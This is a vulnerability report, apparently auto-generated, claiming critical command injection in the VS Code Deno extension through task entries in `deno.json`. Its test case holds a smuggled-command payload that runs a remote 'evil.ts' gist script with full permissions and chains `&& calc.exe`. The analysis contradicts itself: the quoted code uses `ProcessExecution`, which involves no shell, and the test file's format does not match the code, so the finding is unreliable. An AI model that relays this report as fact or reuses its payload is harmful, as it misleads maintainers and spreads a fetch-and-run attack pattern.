- Vulnerability Name: Command Injection via Unsanitized Task Commands in `deno.json`
- Description:
    1. Attacker crafts a malicious `deno.json` file. This file contains a task definition where the `command` or `args` fields are designed to execute arbitrary commands in addition to the intended Deno command. For example, an attacker might use command chaining (e.g., `&&`, `;`) or shell redirection to inject malicious commands.
    2. The victim opens a workspace in VS Code that contains this malicious `deno.json` file and has the Deno extension enabled.
    3. The Deno Language Server reads the task definitions from `deno.json` and provides them to the VS Code extension client.
    4. The VS Code Deno extension client displays these tasks in the Deno Tasks sidebar.
    5. When the victim attempts to run the seemingly legitimate task (e.g., by clicking "Run Task" in the sidebar), the extension client uses `vscode.ProcessExecution` to execute the task.
    6. Due to the lack of sanitization, the injected malicious commands embedded in the `command` or `args` from `deno.json` are executed by the system shell along with the intended Deno command. This results in arbitrary code execution on the victim's machine.
- Impact:
    - Arbitrary code execution on the user's machine with the privileges of the VS Code process.
    - Potential for data theft, malware installation, and system compromise.
- Vulnerability Rank: Critical
- Currently implemented mitigations:
    - None. The code directly uses the task `command` and `args` from the configuration in `vscode.ProcessExecution` without any sanitization or validation in `client\src\tasks.ts`.
- Missing mitigations:
    - Input sanitization and validation for task `command` and `args` obtained from `deno.json` (or from the LSP which reads `deno.json`).
    - Use of parameterized commands or safer command execution methods that prevent command injection.
    - Consider restricting task commands to a predefined safe list or using more structured configuration for commands and arguments to avoid shell interpretation of user-provided strings.
- Preconditions:
    1. The victim has the VS Code Deno extension installed and enabled.
    2. The victim opens a workspace in VS Code that contains a malicious `deno.json` file crafted by an attacker.
    3. The attacker has successfully placed a malicious `deno.json` file within a workspace that the victim might open (e.g., via a compromised repository or by social engineering to trick the victim into opening a malicious project).
    4. The victim must execute the malicious task, either intentionally or unintentionally (e.g., by being misled by the task name).
- Source code analysis:
    1. In `client\src\tasks.ts`, the functions `buildDenoTask` and `buildDenoConfigTask` are responsible for creating `vscode.Task` objects.
    2. Both functions utilize `vscode.ProcessExecution` to define how the tasks are executed.
    3. `vscode.ProcessExecution` takes a `command` and `args` as input, which are directly derived from the `DenoTaskDefinition` or configuration without any sanitization.
    4. Specifically, in `buildDenoConfigTask`, the `command` and `name` arguments, which can originate from `deno.json` task definitions, are used to construct the `ProcessExecution`.
    5. In `buildDenoTask`, the `definition.command` and `definition.args` are directly passed to `ProcessExecution`.
    ```typescript
    // client\src\tasks.ts - buildDenoTask
    export function buildDenoTask(
      target: vscode.WorkspaceFolder,
      process: string,
      definition: DenoTaskDefinition,
      name: string,
      args: string[], // <-- Unsanitized arguments potentially from deno.json
      problemMatchers: string[],
    ): vscode.Task {
      const exec = new vscode.ProcessExecution(
        process, // Deno executable path (less likely to be directly vulnerable)
        args,    // <-- Vulnerable as args are directly used from definition
        definition,
      );

      return new vscode.Task(
        definition,
        target,
        name,
        TASK_SOURCE,
        exec,
        problemMatchers,
      );
    }

    // client\src\tasks.ts - buildDenoConfigTask
    export function buildDenoConfigTask(
      scope: vscode.WorkspaceFolder,
      process: string,
      name: string,     // <-- Potentially from deno.json task name
      command: string | undefined, // <-- Potentially from deno.json task command/detail
      sourceUri?: vscode.Uri,
    ): vscode.Task {
      const args = [];
      if (sourceUri && vscode.Uri.joinPath(sourceUri, "..").toString() != scope.uri.toString()) {
        const configPath = path.relative(scope.uri.fsPath, sourceUri.fsPath);
        args.push("-c", configPath);
      }
      args.push(name); // <-- Potentially from deno.json task name
      const task = new vscode.Task(
        {
          type: TASK_TYPE,
          name: name,    // <-- Potentially from deno.json task name
          command: "task", // Fixed "task" command, but args are still influenced
          args,         // <-- args include potentially unsanitized name
          sourceUri,
        },
        scope,
        name,
        TASK_SOURCE,
        new vscode.ProcessExecution(process, ["task", ...args]), // <-- ProcessExecution with potentially vulnerable args
        ["$deno"],
      );
      task.detail = `$ ${command}`; // Detail string, potentially unsanitized command
      return task;
    }
    ```
- Security test case:
    1. Create a new workspace folder and open it in VS Code.
    2. Create a file named `deno.json` at the root of the workspace with the following content:
    ```json
    {
      "tasks": {
        "MaliciousTask": {
          "command": "run",
          "args": [
            "-A",
            "https://gist.githubusercontent.com/security-expert-64/4e9344969844ad918441044b3655137b/raw/evil.ts && calc.exe"
          ]
        }
      }
    }
    ```
       *(Note: Replace `calc.exe` with the appropriate calculator command for your operating system if necessary, e.g., `open -a Calculator.app` on macOS, `gnome-calculator` on Linux. Also, ensure `evil.ts` URL is accessible or replace with a local harmless script for testing. Gist URL points to a harmless typescript file for demonstration.)*
    3. Ensure the Deno extension is enabled for this workspace.
    4. Open the "Deno Tasks" explorer in VS Code (View -> Open View... -> Deno Tasks).
    5. You should see a task named "MaliciousTask" listed under your workspace and `deno.json`.
    6. Click the "Run Task" icon (wrench icon) next to "MaliciousTask".
    7. **Expected Outcome (Vulnerable):** Observe that the calculator application (`calc.exe` or equivalent) is launched. This indicates that the command injection was successful, and arbitrary commands could be executed.
    8. **Expected Outcome (Mitigated):** The calculator application should not launch. Only the Deno command related to the task should be executed, ideally resulting in an error if `evil.ts` is not a valid or runnable script in the context of the task.

This test case demonstrates that by crafting a malicious `deno.json` file, an attacker can achieve arbitrary code execution when a user runs the defined task, confirming the command injection vulnerability.
